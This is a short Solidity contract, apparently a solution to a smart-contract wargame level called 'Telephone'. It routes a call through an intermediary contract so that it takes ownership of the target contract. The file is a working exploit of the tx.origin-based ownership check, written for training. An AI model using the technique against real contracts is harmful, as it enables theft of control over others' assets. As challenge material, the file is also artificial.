// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import '../lv04_telephone.sol';

contract Tunnel {

  function changeOwner(address target) public {
    Telephone phone = Telephone(target);
    phone.changeOwner(msg.sender);
  }
}